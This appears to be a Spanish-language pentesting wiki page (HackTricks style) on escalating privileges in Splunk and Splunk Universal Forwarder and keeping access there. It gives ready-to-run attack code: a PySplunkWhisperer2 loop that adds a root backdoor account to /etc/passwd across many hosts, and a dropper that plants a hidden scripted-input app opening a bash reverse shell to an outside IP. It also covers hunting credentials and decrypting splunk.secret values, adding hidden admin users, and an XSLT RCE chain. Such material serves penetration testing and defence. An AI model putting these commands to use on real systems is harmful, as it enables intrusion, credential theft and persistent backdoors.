# LPE y Persistence en Splunk

{{#include ../../banners/hacktricks-training.md}}

Si al **enumerar** una máquina **internamente** o **externamente** encuentras **Splunk en ejecución** (normalmente **8000** para la interfaz web y **8089** para la API de gestión), unas credenciales válidas a menudo pueden convertirse en **code execution** mediante la instalación de apps, scripted inputs o acciones de gestión. Si Splunk se está ejecutando como **root**, esto se convierte con frecuencia en una **privilege escalation** inmediata.

Si solo necesitas la superficie de ataque remota genérica, la enumeración o la ruta de RCE mediante subida de apps, consulta:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Si **ya eres root** y el servicio Splunk no está escuchando únicamente en localhost, también puedes robar **Splunk password hashes**, recuperar **encrypted secrets** o implementar una **malicious app** para mantener la persistencia localmente o en varios forwarders.

## Archivos locales interesantes

Cuando accedes a un host que ejecuta Splunk o Splunk Universal Forwarder, estas suelen ser las rutas más interesantes:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefactos importantes:

- **`$SPLUNK_HOME/etc/passwd`**: usuarios locales de Splunk y hashes de contraseñas.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: clave que Splunk utiliza para cifrar secretos almacenados en varios archivos `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: archivo de bootstrap del administrador inicial; útil en gold images y ante errores de provisioning. Se ignora si `etc/passwd` ya existe.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: ubicación donde suelen habilitarse los scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** o **`$SPLUNK_HOME/etc/apps/`**: buenos lugares para ocultar una app persistente o revisar qué se está distribuyendo actualmente.

## Resumen del exploit del agente Splunk Universal Forwarder

Para obtener más detalles, consulta [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Esto es solo un resumen:<sup>[[1]](#references)</sup>

**Descripción general del exploit:**
Un exploit dirigido al Splunk Universal Forwarder (UF) permite a atacantes que poseen la **contraseña del agente** ejecutar código arbitrario en sistemas que ejecutan el agente, comprometiendo potencialmente una gran parte del entorno.

**Por qué funciona:**

- El servicio de management del UF suele estar expuesto en **TCP 8089**.
- Los atacantes pueden autenticarse en la API e indicar al forwarder que instale un **bundle de app malicioso**.
- La misma primitive puede utilizarse localmente para **LPE** o remotamente para **RCE**.
- Herramientas públicas como **SplunkWhisperer2** crean automáticamente el bundle de la app y pueden adaptar los payloads para targets Linux.

**Formas habituales de recuperar la contraseña:**

- Credenciales en cleartext en documentación, scripts, shares o automation de deployment.
- Hashes de contraseñas dentro de `$SPLUNK_HOME/etc/passwd`, seguidos de cracking offline.
- Golden images o restos del provisioning, como `user-seed.conf`.

**Impacto:**

- Ejecución de código con nivel SYSTEM/root en cada host comprometido.
- Deployment de apps persistentes, backdoors o ransomware.
- Deshabilitar o manipular la telemetría antes de que los datos sean forwardeados.

**Comando de ejemplo para la explotación:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizables:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistencia mediante Scripted Inputs o Malicious Apps

Si tienes **acceso de escritura al filesystem** como `root`/`splunk`, o acceso autenticado para instalar apps, un mecanismo de persistencia muy fiable consiste en dejar una **custom app** con un **scripted input**.<sup>[[2]](#references)</sup> La propia documentación de Splunk espera que los scripted inputs se encuentren en un directorio de la app y se habiliten desde `inputs.conf`.

Diseño típico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` mínimo:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper rápido de Linux:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- El mismo truco funciona en **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.
- Los atacantes suelen pasar desapercibidos modificando un add-on legítimo en lugar de crear una app evidentemente maliciosa.
- En un **deployment server**, colocar una app maliciosa dentro de `deployment-apps/` se convierte en **persistence en toda la flota**, porque los forwarders consultan, descargan apps actualizadas y a menudo se reinician para aplicarlas.

## Robo de credenciales y takeover del administrador

Si puedes leer los archivos locales de Splunk, normalmente hay dos objetivos importantes: recuperar el **acceso de administrador de Splunk** y recuperar las **credenciales de servicios cifradas**.

### Hashes de contraseñas y usuarios locales

Splunk almacena los datos de autenticación local en `etc/passwd`. Dependiendo del despliegue, crackear ese archivo puede permitir recuperar credenciales funcionales para la interfaz web y la API de gestión.

Si ya tienes credenciales válidas de **admin** y Splunk utiliza su backend de autenticación **native**, la propia CLI puede utilizarse para persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` y valores cifrados

Splunk utiliza `etc/auth/splunk.secret` para proteger valores sensibles almacenados en varios archivos de configuración. Si puedes robar tanto el **secret** como los archivos **`.conf`** relevantes, a menudo puedes recuperar o reutilizar:

- shared secrets de forwarder/indexer como `pass4SymmKey`
- contraseñas de private keys TLS como `sslPassword`
- credenciales de bind LDAP como `bindDNPassword`

Esto resulta útil para **lateral movement** incluso cuando la contraseña del administrador de Splunk no se puede crackear.

### Abuso de `user-seed.conf`

`user-seed.conf` solo se utiliza durante el primer inicio o cuando `etc/passwd` no existe. Esto lo hace menos útil en un live box, pero muy interesante en:

- installation templates comprometidos
- container images
- unattended provisioning workflows
- appliances donde Splunk se reinicializa automáticamente

En esos casos, insertar un `HASHED_PASSWORD` generado con `splunk hash-passwd` te proporciona una forma discreta de recuperar el acceso de administrador después del redeployment.

## Abuso de Splunk Queries

Para obtener más detalles, consulta [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Una técnica reciente útil consiste en abusar de **XSLT proporcionado por el usuario** en versiones vulnerables de Splunk Enterprise para convertir una cuenta autenticada con pocos privilegios en **OS command execution** como el usuario `splunk`.

Flujo de alto nivel:

1. Autenticarse en Splunk.
2. Subir un archivo **XSL** malicioso mediante la funcionalidad de preview/upload.
3. Hacer que Splunk renderice los resultados de búsqueda con esa stylesheet subida desde el directorio **dispatch**.
4. Utilizar el payload XSLT para escribir un archivo o activar la ejecución mediante el search pipeline de Splunk (por ejemplo, accediendo a funcionalidad interna como `runshellscript`).

La conclusión ofensiva importante es que este path permite **post-auth RCE sin necesitar app upload**. En Linux normalmente te proporciona acceso a la cuenta **`splunk`**, lo cual sigue siendo valioso porque ese usuario suele ser propietario del application tree, puede leer secrets y puede plantar persistent apps que sobreviven a la pérdida del shell.

Un path representativo utilizado durante la explotación es:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Si Splunk se está ejecutando con demasiados privilegios, o si el usuario `splunk` tiene acceso a scripts peligrosos, unidades de servicio modificables o reglas de `sudo` inseguras, esto se convierte en una cadena limpia de **LPE**.

## Referencias

- [1] [Abusando de Splunk Forwarders para RCE y Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Cuidado con TraitorWare: usando Splunk para Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Aviso de seguridad de Splunk SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Análisis de CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
